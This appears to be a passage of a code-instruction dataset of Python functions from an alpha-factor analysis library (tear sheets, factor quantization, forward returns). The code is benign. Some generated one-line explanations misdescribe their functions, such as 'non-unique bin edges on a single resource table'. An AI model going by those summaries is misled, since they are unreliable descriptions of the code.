positions.mul(\n            cumrets.reindex(positions.index) * capital, axis=0)\n\n    #\n    #\n    #\n    # Build benchmark returns as the factor universe mean returns traded at\n    # 'benchmark_period' frequency\n    #\n    fwd_ret_cols = utils.get_forward_returns_columns(factor_data.columns)\n    if benchmark_period in fwd_ret_cols:\n        benchmark_data = factor_data.copy()\n        # make sure no negative positions\n        benchmark_data['factor'] = benchmark_data['factor'].abs()\n        benchmark_rets = factor_cumulative_returns(benchmark_data,\n                                                   benchmark_period,\n                                                   long_short=False,\n                                                   group_neutral=False,\n                                                   equal_weight=True)\n        benchmark_rets = benchmark_rets.resample(\n            '1D').last().fillna(method='ffill')\n        benchmark_rets = benchmark_rets.pct_change().fillna(0)\n        benchmark_rets.name = 'benchmark'\n    else:\n        benchmark_rets = None\n\n    return returns, positions, benchmark_rets"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a small summary tear sheet with returns information and turnover analysis.", "response": "def create_summary_tear_sheet(factor_data,\n                              long_short=True,\n                              group_neutral=False):\n    \"\"\"\n    Creates a small summary tear sheet with returns, information, and turnover\n    analysis.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    long_short : bool\n        Should this computation happen on a long short portfolio? if so, then\n        mean quantile returns will be demeaned across the factor universe.\n    group_neutral : bool\n        Should this computation happen on a group neutral portfolio? if so,\n        returns demeaning will occur on the group level.\n    \"\"\"\n\n    # Returns Analysis\n    mean_quant_ret, std_quantile = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_group=False,\n                                     demeaned=long_short,\n                                     group_adjust=group_neutral)\n\n    mean_quant_rateret = \\\n        mean_quant_ret.apply(utils.rate_of_return, axis=0,\n                             base_period=mean_quant_ret.columns[0])\n\n    mean_quant_ret_bydate, std_quant_daily = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_date=True,\n                                     by_group=False,\n                                     demeaned=long_short,\n                                     group_adjust=group_neutral)\n\n    mean_quant_rateret_bydate = mean_quant_ret_bydate.apply(\n        utils.rate_of_return,\n        axis=0,\n        base_period=mean_quant_ret_bydate.columns[0]\n    )\n\n    compstd_quant_daily = std_quant_daily.apply(\n        utils.std_conversion, axis=0,\n        base_period=std_quant_daily.columns[0]\n    )\n\n    alpha_beta = perf.factor_alpha_beta(factor_data,\n                                        demeaned=long_short,\n                                        group_adjust=group_neutral)\n\n    mean_ret_spread_quant, std_spread_quant = perf.compute_mean_returns_spread(\n        mean_quant_rateret_bydate,\n        factor_data['factor_quantile'].max(),\n        factor_data['factor_quantile'].min(),\n        std_err=compstd_quant_daily)\n\n    periods = utils.get_forward_returns_columns(factor_data.columns)\n\n    fr_cols = len(periods)\n    vertical_sections = 2 + fr_cols * 3\n    gf = GridFigure(rows=vertical_sections, cols=1)\n\n    plotting.plot_quantile_statistics_table(factor_data)\n\n    plotting.plot_returns_table(alpha_beta,\n                                mean_quant_rateret,\n                                mean_ret_spread_quant)\n\n    plotting.plot_quantile_returns_bar(mean_quant_rateret,\n                                       by_group=False,\n                                       ylim_percentiles=None,\n                                       ax=gf.next_row())\n\n    # Information Analysis\n    ic = perf.factor_information_coefficient(factor_data)\n    plotting.plot_information_table(ic)\n\n    # Turnover Analysis\n    quantile_factor = factor_data['factor_quantile']\n\n    quantile_turnover = \\\n        {p: pd.concat([perf.quantile_turnover(quantile_factor, q, p)\n                       for q in range(1, int(quantile_factor.max()) + 1)],\n                      axis=1)\n            for p in periods}\n\n    autocorrelation = pd.concat(\n        [perf.factor_rank_autocorrelation(factor_data, period) for period in\n         periods], axis=1)\n\n    plotting.plot_turnover_table(autocorrelation, quantile_turnover)\n\n    plt.show()\n    gf.close()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a tear sheet for the returns analysis of a factor.", "response": "def create_returns_tear_sheet(factor_data,\n                              long_short=True,\n                              group_neutral=False,\n                              by_group=False):\n    \"\"\"\n    Creates a tear sheet for returns analysis of a factor.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to,\n        and (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    long_short : bool\n        Should this computation happen on a long short portfolio? if so, then\n        mean quantile returns will be demeaned across the factor universe.\n        Additionally factor values will be demeaned across the factor universe\n        when factor weighting the portfolio for cumulative returns plots\n    group_neutral : bool\n        Should this computation happen on a group neutral portfolio? if so,\n        returns demeaning will occur on the group level.\n        Additionally each group will weight the same in cumulative returns\n        plots\n    by_group : bool\n        If True, display graphs separately for each group.\n    \"\"\"\n\n    factor_returns = perf.factor_returns(factor_data,\n                                         long_short,\n                                         group_neutral)\n\n    mean_quant_ret, std_quantile = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_group=False,\n                                     demeaned=long_short,\n                                     group_adjust=group_neutral)\n\n    mean_quant_rateret = \\\n        mean_quant_ret.apply(utils.rate_of_return, axis=0,\n                             base_period=mean_quant_ret.columns[0])\n\n    mean_quant_ret_bydate, std_quant_daily = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_date=True,\n                                     by_group=False,\n                                     demeaned=long_short,\n                                     group_adjust=group_neutral)\n\n    mean_quant_rateret_bydate = mean_quant_ret_bydate.apply(\n        utils.rate_of_return, axis=0,\n        base_period=mean_quant_ret_bydate.columns[0]\n    )\n\n    compstd_quant_daily = \\\n        std_quant_daily.apply(utils.std_conversion, axis=0,\n                              base_period=std_quant_daily.columns[0])\n\n    alpha_beta = perf.factor_alpha_beta(factor_data,\n                                        factor_returns,\n                                        long_short,\n                                        group_neutral)\n\n    mean_ret_spread_quant, std_spread_quant = \\\n        perf.compute_mean_returns_spread(mean_quant_rateret_bydate,\n                                         factor_data['factor_quantile'].max(),\n                                         factor_data['factor_quantile'].min(),\n                                         std_err=compstd_quant_daily)\n\n    fr_cols = len(factor_returns.columns)\n    vertical_sections = 2 + fr_cols * 3\n    gf = GridFigure(rows=vertical_sections, cols=1)\n\n    plotting.plot_returns_table(alpha_beta,\n                                mean_quant_rateret,\n                                mean_ret_spread_quant)\n\n    plotting.plot_quantile_returns_bar(mean_quant_rateret,\n                                       by_group=False,\n                                       ylim_percentiles=None,\n                                       ax=gf.next_row())\n\n    plotting.plot_quantile_returns_violin(mean_quant_rateret_bydate,\n                                          ylim_percentiles=(1, 99),\n                                          ax=gf.next_row())\n\n    trading_calendar = factor_data.index.levels[0].freq\n    if trading_calendar is None:\n        trading_calendar = pd.tseries.offsets.BDay()\n        warnings.warn(\n            \"'freq' not set in factor_data index: assuming business day\",\n            UserWarning\n        )\n\n    for p in factor_returns:\n\n        title = ('Factor Weighted '\n                 + ('Group Neutral ' if group_neutral else '')\n                 + ('Long/Short ' if long_short else '')\n                 + \"Portfolio Cumulative Return ({} Period)\".format(p))\n\n        plotting.plot_cumulative_returns(\n            factor_returns[p],\n            period=p,\n            freq=trading_calendar,\n            title=title,\n            ax=gf.next_row()\n        )\n\n        plotting.plot_cumulative_returns_by_quantile(\n            mean_quant_ret_bydate[p],\n            period=p,\n            freq=trading_calendar,\n            ax=gf.next_row()\n        )\n\n    ax_mean_quantile_returns_spread_ts = [gf.next_row()\n                                          for x in range(fr_cols)]\n    plotting.plot_mean_quantile_returns_spread_time_series(\n        mean_ret_spread_quant,\n        std_err=std_spread_quant,\n        bandwidth=0.5,\n        ax=ax_mean_quantile_returns_spread_ts\n    )\n\n    plt.show()\n    gf.close()\n\n    if by_group:\n        mean_return_quantile_group, mean_return_quantile_group_std_err = \\\n            perf.mean_return_by_quantile(factor_data,\n                                         by_date=False,\n                                         by_group=True,\n                                         demeaned=long_short,\n                                         group_adjust=group_neutral)\n\n        mean_quant_rateret_group = mean_return_quantile_group.apply(\n            utils.rate_of_return, axis=0,\n            base_period=mean_return_quantile_group.columns[0]\n        )\n\n        num_groups = len(mean_quant_rateret_group.index\n                         .get_level_values('group').unique())\n\n        vertical_sections = 1 + (((num_groups - 1) // 2) + 1)\n        gf = GridFigure(rows=vertical_sections, cols=2)\n\n        ax_quantile_returns_bar_by_group = [gf.next_cell()\n                                            for _ in range(num_groups)]\n        plotting.plot_quantile_returns_bar(mean_quant_rateret_group,\n                                           by_group=True,\n                                           ylim_percentiles=(5, 95),\n                                           ax=ax_quantile_returns_bar_by_group)\n        plt.show()\n        gf.close()"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a tear sheet for information analysis of a factor.", "response": "def create_information_tear_sheet(factor_data,\n                                  group_neutral=False,\n                                  by_group=False):\n    \"\"\"\n    Creates a tear sheet for information analysis of a factor.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    group_neutral : bool\n        Demean forward returns by group before computing IC.\n    by_group : bool\n        If True, display graphs separately for each group.\n    \"\"\"\n\n    ic = perf.factor_information_coefficient(factor_data, group_neutral)\n\n    plotting.plot_information_table(ic)\n\n    columns_wide = 2\n    fr_cols = len(ic.columns)\n    rows_when_wide = (((fr_cols - 1) // columns_wide) + 1)\n    vertical_sections = fr_cols + 3 * rows_when_wide + 2 * fr_cols\n    gf = GridFigure(rows=vertical_sections, cols=columns_wide)\n\n    ax_ic_ts = [gf.next_row() for _ in range(fr_cols)]\n    plotting.plot_ic_ts(ic, ax=ax_ic_ts)\n\n    ax_ic_hqq = [gf.next_cell() for _ in range(fr_cols * 2)]\n    plotting.plot_ic_hist(ic, ax=ax_ic_hqq[::2])\n    plotting.plot_ic_qq(ic, ax=ax_ic_hqq[1::2])\n\n    if not by_group:\n\n        mean_monthly_ic = \\\n            perf.mean_information_coefficient(factor_data,\n                                              group_adjust=group_neutral,\n                                              by_group=False,\n                                              by_time=\"M\")\n        ax_monthly_ic_heatmap = [gf.next_cell() for x in range(fr_cols)]\n        plotting.plot_monthly_ic_heatmap(mean_monthly_ic,\n                                         ax=ax_monthly_ic_heatmap)\n\n    if by_group:\n        mean_group_ic = \\\n            perf.mean_information_coefficient(factor_data,\n                                              group_adjust=group_neutral,\n                                              by_group=True)\n\n        plotting.plot_ic_by_group(mean_group_ic, ax=gf.next_row())\n\n    plt.show()\n    gf.close()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_turnover_tear_sheet(factor_data, turnover_periods=None):\n\n    if turnover_periods is None:\n        turnover_periods = utils.get_forward_returns_columns(\n            factor_data.columns)\n\n    quantile_factor = factor_data['factor_quantile']\n\n    quantile_turnover = \\\n        {p: pd.concat([perf.quantile_turnover(quantile_factor, q, p)\n                       for q in range(1, int(quantile_factor.max()) + 1)],\n                      axis=1)\n            for p in turnover_periods}\n\n    autocorrelation = pd.concat(\n        [perf.factor_rank_autocorrelation(factor_data, period) for period in\n         turnover_periods], axis=1)\n\n    plotting.plot_turnover_table(autocorrelation, quantile_turnover)\n\n    fr_cols = len(turnover_periods)\n    columns_wide = 1\n    rows_when_wide = (((fr_cols - 1) // 1) + 1)\n    vertical_sections = fr_cols + 3 * rows_when_wide + 2 * fr_cols\n    gf = GridFigure(rows=vertical_sections, cols=columns_wide)\n\n    for period in turnover_periods:\n        if quantile_turnover[period].isnull().all().all():\n            continue\n        plotting.plot_top_bottom_quantile_turnover(quantile_turnover[period],\n                                                   period=period,\n                                                   ax=gf.next_row())\n\n    for period in autocorrelation:\n        if autocorrelation[period].isnull().all():\n            continue\n        plotting.plot_factor_rank_auto_correlation(autocorrelation[period],\n                                                   period=period,\n                                                   ax=gf.next_row())\n\n    plt.show()\n    gf.close()", "response": "Creates a tear sheet for analyzing the turnover properties of a factor."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a full tear sheet for analysis and evaluating a single alpha factor.", "response": "def create_full_tear_sheet(factor_data,\n                           long_short=True,\n                           group_neutral=False,\n                           by_group=False):\n    \"\"\"\n    Creates a full tear sheet for analysis and evaluating single\n    return predicting (alpha) factor.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    long_short : bool\n        Should this computation happen on a long short portfolio?\n        - See tears.create_returns_tear_sheet for details on how this flag\n        affects returns analysis\n    group_neutral : bool\n        Should this computation happen on a group neutral portfolio?\n        - See tears.create_returns_tear_sheet for details on how this flag\n        affects returns analysis\n        - See tears.create_information_tear_sheet for details on how this\n        flag affects information analysis\n    by_group : bool\n        If True, display graphs separately for each group.\n    \"\"\"\n\n    plotting.plot_quantile_statistics_table(factor_data)\n    create_returns_tear_sheet(factor_data,\n                              long_short,\n                              group_neutral,\n                              by_group,\n                              set_context=False)\n    create_information_tear_sheet(factor_data,\n                                  group_neutral,\n                                  by_group,\n                                  set_context=False)\n    create_turnover_tear_sheet(factor_data, set_context=False)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create_event_returns_tear_sheet(factor_data,\n                                    prices,\n                                    avgretplot=(5, 15),\n                                    long_short=True,\n                                    group_neutral=False,\n                                    std_bar=True,\n                                    by_group=False):\n    \"\"\"\n    Creates a tear sheet to view the average cumulative returns for a\n    factor within a window (pre and post event).\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex Series indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, the factor\n        quantile/bin that factor value belongs to and (optionally) the group\n        the asset belongs to.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    prices : pd.DataFrame\n        A DataFrame indexed by date with assets in the columns containing the\n        pricing data.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    avgretplot: tuple (int, int) - (before, after)\n        If not None, plot quantile average cumulative returns\n    long_short : bool\n        Should this computation happen on a long short portfolio? if so then\n        factor returns will be demeaned across the factor universe\n    group_neutral : bool\n        Should this computation happen on a group neutral portfolio? if so,\n        returns demeaning will occur on the group level.\n    std_bar : boolean, optional\n        Show plots with standard deviation bars, one for each quantile\n    by_group : bool\n        If True, display graphs separately for each group.\n    \"\"\"\n\n    before, after = avgretplot\n\n    avg_cumulative_returns = \\\n        perf.average_cumulative_return_by_quantile(\n            factor_data,\n            prices,\n            periods_before=before,\n            periods_after=after,\n            demeaned=long_short,\n            group_adjust=group_neutral)\n\n    num_quantiles = int(factor_data['factor_quantile'].max())\n\n    vertical_sections = 1\n    if std_bar:\n        vertical_sections += (((num_quantiles - 1) // 2) + 1)\n    cols = 2 if num_quantiles != 1 else 1\n    gf = GridFigure(rows=vertical_sections, cols=cols)\n    plotting.plot_quantile_average_cumulative_return(avg_cumulative_returns,\n                                                     by_quantile=False,\n                                                     std_bar=False,\n                                                     ax=gf.next_row())\n    if std_bar:\n        ax_avg_cumulative_returns_by_q = [gf.next_cell()\n                                          for _ in range(num_quantiles)]\n        plotting.plot_quantile_average_cumulative_return(\n            avg_cumulative_returns,\n            by_quantile=True,\n            std_bar=True,\n            ax=ax_avg_cumulative_returns_by_q)\n\n    plt.show()\n    gf.close()\n\n    if by_group:\n        groups = factor_data['group'].unique()\n        num_groups = len(groups)\n        vertical_sections = ((num_groups - 1) // 2) + 1\n        gf = GridFigure(rows=vertical_sections, cols=2)\n\n        avg_cumret_by_group = \\\n            perf.average_cumulative_return_by_quantile(\n                factor_data,\n                prices,\n                periods_before=before,\n                periods_after=after,\n                demeaned=long_short,\n                group_adjust=group_neutral,\n                by_group=True)\n\n        for group, avg_cumret in avg_cumret_by_group.groupby(level='group'):\n            avg_cumret.index = avg_cumret.index.droplevel('group')\n            plotting.plot_quantile_average_cumulative_return(\n                avg_cumret,\n                by_quantile=False,\n                std_bar=False,\n                title=group,\n                ax=gf.next_cell())\n\n        plt.show()\n        gf.close()", "response": "Creates a tear sheet to view the average cumulative returns for a single alpha factor and a single group of assets."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates an event study tear sheet for analysis of a specific event.", "response": "def create_event_study_tear_sheet(factor_data,\n                                  prices=None,\n                                  avgretplot=(5, 15),\n                                  rate_of_ret=True,\n                                  n_bars=50):\n    \"\"\"\n    Creates an event study tear sheet for analysis of a specific event.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single event, forward returns for each\n        period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n    prices : pd.DataFrame, required only if 'avgretplot' is provided\n        A DataFrame indexed by date with assets in the columns containing the\n        pricing data.\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n    avgretplot: tuple (int, int) - (before, after), optional\n        If not None, plot event style average cumulative returns within a\n        window (pre and post event).\n    rate_of_ret : bool, optional\n        Display rate of return instead of simple return in 'Mean Period Wise\n        Return By Factor Quantile' and 'Period Wise Return By Factor Quantile'\n        plots\n    n_bars : int, optional\n        Number of bars in event distribution plot\n    \"\"\"\n\n    long_short = False\n\n    plotting.plot_quantile_statistics_table(factor_data)\n\n    gf = GridFigure(rows=1, cols=1)\n    plotting.plot_events_distribution(events=factor_data['factor'],\n                                      num_bars=n_bars,\n                                      ax=gf.next_row())\n    plt.show()\n    gf.close()\n\n    if prices is not None and avgretplot is not None:\n\n        create_event_returns_tear_sheet(factor_data=factor_data,\n                                        prices=prices,\n                                        avgretplot=avgretplot,\n                                        long_short=long_short,\n                                        group_neutral=False,\n                                        std_bar=True,\n                                        by_group=False)\n\n    factor_returns = perf.factor_returns(factor_data,\n                                         demeaned=False,\n                                         equal_weight=True)\n\n    mean_quant_ret, std_quantile = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_group=False,\n                                     demeaned=long_short)\n    if rate_of_ret:\n        mean_quant_ret = \\\n            mean_quant_ret.apply(utils.rate_of_return, axis=0,\n                                 base_period=mean_quant_ret.columns[0])\n\n    mean_quant_ret_bydate, std_quant_daily = \\\n        perf.mean_return_by_quantile(factor_data,\n                                     by_date=True,\n                                     by_group=False,\n                                     demeaned=long_short)\n    if rate_of_ret:\n        mean_quant_ret_bydate = mean_quant_ret_bydate.apply(\n            utils.rate_of_return, axis=0,\n            base_period=mean_quant_ret_bydate.columns[0]\n        )\n\n    fr_cols = len(factor_returns.columns)\n    vertical_sections = 2 + fr_cols * 1\n    gf = GridFigure(rows=vertical_sections, cols=1)\n\n    plotting.plot_quantile_returns_bar(mean_quant_ret,\n                                       by_group=False,\n                                       ylim_percentiles=None,\n                                       ax=gf.next_row())\n\n    plotting.plot_quantile_returns_violin(mean_quant_ret_bydate,\n                                          ylim_percentiles=(1, 99),\n                                          ax=gf.next_row())\n\n    trading_calendar = factor_data.index.levels[0].freq\n    if trading_calendar is None:\n        trading_calendar = pd.tseries.offsets.BDay()\n        warnings.warn(\n            \"'freq' not set in factor_data index: assuming business day\",\n            UserWarning\n        )\n\n    for p in factor_returns:\n\n        plotting.plot_cumulative_returns(\n            factor_returns[p],\n            period=p,\n            freq=trading_calendar,\n            ax=gf.next_row()\n        )\n\n    plt.show()\n    gf.close()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef non_unique_bin_edges_error(func):\n    message = \"\"\"\n\n    An error occurred while computing bins/quantiles on the input provided.\n    This usually happens when the input contains too many identical\n    values and they span more than one quantile. The quantiles are choosen\n    to have the same number of records each, but the same value cannot span\n    multiple quantiles. Possible workarounds are:\n    1 - Decrease the number of quantiles\n    2 - Specify a custom quantiles range, e.g. [0, .50, .75, 1.] to get unequal\n        number of records per quantile\n    3 - Use 'bins' option instead of 'quantiles', 'bins' chooses the\n        buckets to be evenly spaced according to the values themselves, while\n        'quantiles' forces the buckets to have the same number of records.\n    4 - for factors with discrete values use the 'bins' option with custom\n        ranges and create a range for each discrete value\n    Please see utils.get_clean_factor_and_forward_returns documentation for\n    full documentation of 'bins' and 'quantiles' options.\n\n\"\"\"\n\n    def dec(*args, **kwargs):\n        try:\n            return func(*args, **kwargs)\n        except ValueError as e:\n            if 'Bin edges must be unique' in str(e):\n                rethrow(e, message)\n            raise\n    return dec", "response": "Decorator to handle non - unique bin edges on a single resource table."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef quantize_factor(factor_data,\n                    quantiles=5,\n                    bins=None,\n                    by_group=False,\n                    no_raise=False,\n                    zero_aware=False):\n    \"\"\"\n    Computes period wise factor quantiles.\n\n    Parameters\n    ----------\n    factor_data : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n\n    quantiles : int or sequence[float]\n        Number of equal-sized quantile buckets to use in factor bucketing.\n        Alternately sequence of quantiles, allowing non-equal-sized buckets\n        e.g. [0, .10, .5, .90, 1.] or [.05, .5, .95]\n        Only one of 'quantiles' or 'bins' can be not-None\n    bins : int or sequence[float]\n        Number of equal-width (valuewise) bins to use in factor bucketing.\n        Alternately sequence of bin edges allowing for non-uniform bin width\n        e.g. [-4, -2, -0.5, 0, 10]\n        Only one of 'quantiles' or 'bins' can be not-None\n    by_group : bool, optional\n        If True, compute quantile buckets separately for each group.\n    no_raise: bool, optional\n        If True, no exceptions are thrown and the values for which the\n        exception would have been thrown are set to np.NaN\n    zero_aware : bool, optional\n        If True, compute quantile buckets separately for positive and negative\n        signal values. This is useful if your signal is centered and zero is\n        the separation between long and short signals, respectively.\n\n    Returns\n    -------\n    factor_quantile : pd.Series\n        Factor quantiles indexed by date and asset.\n    \"\"\"\n    if not ((quantiles is not None and bins is None) or\n            (quantiles is None and bins is not None)):\n        raise ValueError('Either quantiles or bins should be provided')\n\n    if zero_aware and not (isinstance(quantiles, int)\n                           or isinstance(bins, int)):\n        msg = (\"zero_aware should only be True when quantiles or bins is an\"\n               \" integer\")\n        raise ValueError(msg)\n\n    def quantile_calc(x, _quantiles, _bins, _zero_aware, _no_raise):\n        try:\n            if _quantiles is not None and _bins is None and not _zero_aware:\n                return pd.qcut(x, _quantiles, labels=False) + 1\n            elif _quantiles is not None and _bins is None and _zero_aware:\n                pos_quantiles = pd.qcut(x[x >= 0], _quantiles // 2,\n                                        labels=False) + _quantiles // 2 + 1\n                neg_quantiles = pd.qcut(x[x < 0], _quantiles // 2,\n                                        labels=False) + 1\n                return pd.concat([pos_quantiles, neg_quantiles]).sort_index()\n            elif _bins is not None and _quantiles is None and not _zero_aware:\n                return pd.cut(x, _bins, labels=False) + 1\n            elif _bins is not None and _quantiles is None and _zero_aware:\n                pos_bins = pd.cut(x[x >= 0], _bins // 2,\n                                  labels=False) + _bins // 2 + 1\n                neg_bins = pd.cut(x[x < 0], _bins // 2,\n                                  labels=False) + 1\n                return pd.concat([pos_bins, neg_bins]).sort_index()\n        except Exception as e:\n            if _no_raise:\n                return pd.Series(index=x.index)\n            raise e\n\n    grouper = [factor_data.index.get_level_values('date')]\n    if by_group:\n        grouper.append('group')\n\n    factor_quantile = factor_data.groupby(grouper)['factor'] \\\n        .apply(quantile_calc, quantiles, bins, zero_aware, no_raise)\n    factor_quantile.name = 'factor_quantile'\n\n    return factor_quantile.dropna()", "response": "Quantize a factor by factor data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ninferring the trading calendar from factor and price information.", "response": "def infer_trading_calendar(factor_idx, prices_idx):\n    \"\"\"\n    Infer the trading calendar from factor and price information.\n\n    Parameters\n    ----------\n    factor_idx : pd.DatetimeIndex\n        The factor datetimes for which we are computing the forward returns\n    prices_idx : pd.DatetimeIndex\n        The prices datetimes associated withthe factor data\n\n    Returns\n    -------\n    calendar : pd.DateOffset\n    \"\"\"\n    full_idx = factor_idx.union(prices_idx)\n\n    traded_weekdays = []\n    holidays = []\n\n    days_of_the_week = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']\n    for day, day_str in enumerate(days_of_the_week):\n\n        weekday_mask = (full_idx.dayofweek == day)\n\n        # drop days of the week that are not traded at all\n        if not weekday_mask.any():\n            continue\n        traded_weekdays.append(day_str)\n\n        # look for holidays\n        used_weekdays = full_idx[weekday_mask].normalize()\n        all_weekdays = pd.date_range(full_idx.min(), full_idx.max(),\n                                     freq=CustomBusinessDay(weekmask=day_str)\n                                     ).normalize()\n        _holidays = all_weekdays.difference(used_weekdays)\n        _holidays = [timestamp.date() for timestamp in _holidays]\n        holidays.extend(_holidays)\n\n    traded_weekdays = ' '.join(traded_weekdays)\n    return CustomBusinessDay(weekmask=traded_weekdays, holidays=holidays)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef compute_forward_returns(factor,\n                            prices,\n                            periods=(1, 5, 10),\n                            filter_zscore=None,\n                            cumulative_returns=True):\n    \"\"\"\n    Finds the N period forward returns (as percent change) for each asset\n    provided.\n\n    Parameters\n    ----------\n    factor : pd.Series - MultiIndex\n        A MultiIndex Series indexed by timestamp (level 0) and asset\n        (level 1), containing the values for a single alpha factor.\n\n        - See full explanation in utils.get_clean_factor_and_forward_returns\n\n    prices : pd.DataFrame\n        Pricing data to use in forward price calculation.\n        Assets as columns, dates as index. Pricing data must\n        span the factor analysis time period plus an additional buffer window\n        that is greater than the maximum number of expected periods\n        in the forward returns calculations.\n    periods : sequence[int]\n        periods to compute forward returns on.\n    filter_zscore : int or float, optional\n        Sets forward returns greater than X standard deviations\n        from the the mean to nan. Set it to 'None' to avoid filtering.\n        Caution: this outlier filtering incorporates lookahead bias.\n    cumulative_returns : bool, optional\n        If True, forward returns columns will contain cumulative returns.\n        Setting this to False is useful if you want to analyze how predictive\n        a factor is for a single forward day.\n\n    Returns\n    -------\n    forward_returns : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by timestamp (level 0) and asset\n        (level 1), containing the forward returns for assets.\n        Forward returns column names follow the format accepted by\n        pd.Timedelta (e.g. '1D', '30m', '3h15m', '1D1h', etc).\n        'date' index freq property (forward_returns.index.levels[0].freq)\n        will be set to a trading calendar (pandas DateOffset) inferred\n        from the input data (see infer_trading_calendar for more details).\n    \"\"\"\n\n    factor_dateindex = factor.index.levels[0]\n    if factor_dateindex.tz != prices.index.tz:\n        raise NonMatchingTimezoneError(\"The timezone of 'factor' is not the \"\n                                       \"same as the timezone of 'prices'. See \"\n                                       \"the pandas methods tz_localize and \"\n                                       \"tz_convert.\")\n\n    freq = infer_trading_calendar(factor_dateindex, prices.index)\n\n    factor_dateindex = factor_dateindex.intersection(prices.index)\n\n    if len(factor_dateindex) == 0:\n        raise ValueError(\"Factor and prices indices don't match: make sure \"\n                         \"they have the same convention in terms of datetimes \"\n                         \"and symbol-names\")\n\n    # chop prices down to only the assets we care about (= unique assets in\n    # `factor`).  we could modify `prices` in place, but that might confuse\n    # the caller.\n    prices = prices.filter(items=factor.index.levels[1])\n\n    raw_values_dict = {}\n    column_list = []\n\n    for period in sorted(periods):\n        if cumulative_returns:\n            returns = prices.pct_change(period)\n        else:\n            returns = prices.pct_change()\n\n        forward_returns = \\\n            returns.shift(-period).reindex(factor_dateindex)\n\n        if filter_zscore is not None:\n            mask = abs(\n                forward_returns - forward_returns.mean()\n            ) > (filter_zscore * forward_returns.std())\n            forward_returns[mask] = np.nan\n\n        #\n        # Find the period length, which will be the column name. We'll test\n        # several entries in order to find out the most likely period length\n        # (in case the user passed inconsinstent data)\n        #\n        days_diffs = []\n        for i in range(30):\n            if i >= len(forward_returns.index):\n                break\n            p_idx = prices.index.get_loc(forward_returns.index[i])\n            if p_idx is None or p_idx < 0 or (\n                    p_idx + period) >= len(prices.index):\n                continue\n            start = prices.index[p_idx]\n            end = prices.index[p_idx + period]\n            period_len = diff_custom_calendar_timedeltas(start, end, freq)\n            days_diffs.append(period_len.components.days)\n\n        delta_days = period_len.components.days - mode(days_diffs).mode[0]\n        period_len -= pd.Timedelta(days=delta_days)\n        label = timedelta_to_string(period_len)\n\n        column_list.append(label)\n\n        raw_values_dict[label] = np.concatenate(forward_returns.values)\n\n    df = pd.DataFrame.from_dict(raw_values_dict)\n    df.set_index(\n        pd.MultiIndex.from_product(\n            [factor_dateindex, prices.columns],\n            names=['date', 'asset']\n        ),\n        inplace=True\n    )\n    df = df.reindex(factor.index)\n\n    # now set the columns correctly\n    df = df[column_list]\n\n    df.index.levels[0].freq = freq\n    df.index.levels[0].name = \"date\"\n    df.index.levels[1].name = \"asset\"\n\n    return df", "response": "This function calculates the forward returns for a single factor and a set of assets."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef demean_forward_returns(factor_data, grouper=None):\n\n    factor_data = factor_data.copy()\n\n    if not grouper:\n        grouper = factor_data.index.get_level_values('date')\n\n    cols = get_forward_returns_columns(factor_data.columns)\n    factor_data[cols] = factor_data.groupby(grouper)[cols] \\\n        .transform(lambda x: x - x.mean())\n\n    return factor_data", "response": "Convert forward returns to returns relative to mean\n    period wise all - universe or group returns."}
